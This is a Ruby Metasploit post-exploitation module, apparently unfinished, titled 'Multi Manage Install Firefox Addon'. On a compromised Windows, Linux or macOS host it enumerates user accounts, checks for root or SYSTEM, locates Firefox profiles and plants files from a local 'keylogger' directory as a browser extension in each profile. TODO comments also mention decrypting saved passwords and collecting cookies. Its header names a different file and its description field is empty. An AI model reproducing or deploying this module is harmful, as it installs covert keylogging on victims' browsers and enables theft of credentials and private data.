##
# $Id: firefox_creds.rb 12594 2011-05-12 17:56:18Z bannedit $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post

	include Msf::Post::File

	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Multi Manage Install Firefox Addon',
			'Description'    => %q{
			},
			'License'        => MSF_LICENSE,
			'Author'         => ['vpb'],
			'Version'        => '$Revision: 666 $',
			'Platform'       => ['windows', 'linux', 'bsd', 'unix', 'osx'],
			'SessionTypes'   => ['meterpreter', 'shell' ]
		))
		#TODO 
		# - add support for decrypting the passwords without a Master Password
		# - Collect cookies.
	end

	def run
		print_status("Determining session platform and type...")
		case session.platform
		when /unix|linux|bsd/
			@platform = :unix
			paths = enum_users_unix
		when /osx/
			@platform = :osx
			paths = enum_users_unix
		when /win/
			@platform = :windows
			if session.type == "shell"
				print_error "Only meterpreter sessions are supported on Windows hosts"
				print_error "Try upgrading the session to a Meterpreter session via \"sessions -u <opt>\""
				return
			else
				drive = session.fs.file.expand_path("%SystemDrive%")
				os = session.sys.config.sysinfo['OS']
			end
			if os =~ /Windows 7|Vista|2008/
				@appdata = '\\AppData\\Roaming'
				@users = drive + '\\Users'
			else
				@appdata = '\\Application Data'
				@users = drive + '\\Documents and Settings'
			end

			print_status("Enumerating users checking for Firefox installs...")
			paths = enum_users_windows
		else
			print_error("Unsupported platform #{session.platform}")
			return
		end
		if paths.nil?
			print_error("No users found with a Firefox directory")
			return
		end

		upload_addon(paths)
	end

	def enum_users_unix
		id = whoami
		if id.empty? or id.nil?
			print_error("This session is not responding, perhaps the session is dead")
		end

		if @platform == :osx
			home = "/Users/"
		else
			home = "/home/"
		end

		if got_root?
			userdirs = session.shell_command("ls #{home}").gsub(/\s/, "\n")
			userdirs << "/root\n"
		else
			print_status("We do not have root privileges")
			print_status("Checking #{id} account for Firefox")
			firefox = session.shell_command("ls #{home}#{id}/.mozilla/firefox/").gsub(/\s/, "\n")

			firefox.each_line do |profile|
				profile.chomp!
				next if profile =~ /No such file/i

				if profile =~ /\.default/
						print_status("Found Firefox Profile for: #{id}")
						return [home + id + "/.mozilla/" + "firefox/" + profile + "/"] 
				end
			end
			return
		end

		# we got root check all user dirs
		paths = []
		userdirs.each_line do |dir|
			dir.chomp!
			next if dir == "." || dir == ".."

			dir = home + dir + "/.mozilla/firefox/" if dir !~ /root/
			if dir =~ /root/
				dir += "/.mozilla/firefox/"
			end

			print_status("Checking for Firefox Profile in: #{dir}")

			stat = session.shell_command("ls #{dir}")
			if stat =~ /No such file/i
				print_error("Mozilla not found in #{dir}")
				next
			end
			stat.gsub!(/\s/, "\n")
			stat.each_line do |profile|
				profile.chomp!
				if profile =~ /\.default/
					print_status("Found Firefox Profile in: #{dir+profile}")
					paths << "#{dir+profile}"
				end
			end
		end
		return paths
	end

	def enum_users_windows
		paths = []

		if got_root?
			session.fs.dir.foreach(@users) do |path|
				next if path =~ /^\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService$/
				firefox = @users + "\\" + path + @appdata
				dir = check_firefox(firefox)
				if dir
					dir.each do |p|
						paths << p
					end
				else
					next
				end
			end
		else # not root
			print_status("We do not have SYSTEM checking #{whoami} account for Firefox")
			path = @users + "\\" + whoami + @appdata
			paths = check_firefox(path)
		end
		return paths
	end

	def check_firefox(path)
		paths = []
		path = path + "\\Mozilla\\"
		print_status("Checking for Firefox directory in: #{path}")

		stat = session.fs.file.stat(path + "Firefox\\profiles.ini") rescue nil
		if !stat
			print_error("Firefox not found")
			return
		end

        ff_found=false

		session.fs.dir.foreach(path) do |fdir|
			if fdir =~ /Firefox/i and @platform == :windows
				#paths << path + fdir + "Profiles\\"
                ff_found=true
				print_good("Found Firefox installed")
				break
			else
				#paths << path + fdir
                ff_found=true
				print_status("Found Firefox installed")
				break
			end
		end

		if not ff_found
			print_error("Firefox not found")
			return
		end

		print_status("Locating Firefox Profiles...")
		print_line("")
		path += "Firefox\\Profiles\\"

		# we should only have profiles in the Profiles directory store them all
		begin
			session.fs.dir.foreach(path) do |pdirs|
				next if pdirs == "." or pdirs == ".."
				print_good("Found Profile #{pdirs}")
				paths << path + pdirs 
			end
		rescue
			print_error("Profiles directory missing")
			return
		end

		if paths.empty?
			return nil
		else
			return paths
		end
	end

    def get_file_as_string(filename)
        data = ''
        f = File.open(filename, "r") 
        f.each_line do |line|
            data += line
        end
        return data
    end

	def upload_addon(paths)
        lpath = ::File.join(Msf::Config.install_root, "data", "post","keylogger")
		paths.each do |path|
            
            print_status("Planting to #{path}") 
            #next
            if session.type=="meterpreter" 
                extpath=path+ "\\extensions"
                begin
                    session.fs.dir.mkdir(extpath)
                rescue
                end

                extpath=extpath+'\\asdf@asdf' #TODO    
                session.fs.dir.mkdir(extpath)
                
                begin
                    Dir['*/'] do |direntry|
                        print_status("Creating #{extpath+direntry}")
                        session.fs.dir.mkdir(extpath+direntry)
                    end
                rescue
                    print_error("Could not create #{direntry}")
                end
                begin
                    Dir.foreach(lpath) do |entry|
                        print_status("uploading #{entry} to #{path}");
                        session.fs.file.upload_file(extpath+"\\"+entry, ::File.join(lpath,entry))
                    end
                rescue
                    print_error("Could not create #{entry}")
                end

            end
            if session.type!="meterpreter"
                print_error("[TODO] non-Meterpreter session support");
            end
        end
	end

	def got_root?
		case @platform
		when :windows
			if session.sys.config.getuid =~ /SYSTEM/
				return true
			else
				return false
			end
		else # unix, bsd, linux, osx
			ret = whoami
			if ret =~ /root/
				return true
			else
				return false
			end
		end
	end

	def whoami
		if @platform == :windows
			return session.fs.file.expand_path("%USERNAME%")
		else
			return session.shell_command("whoami").chomp
		end
	end
end
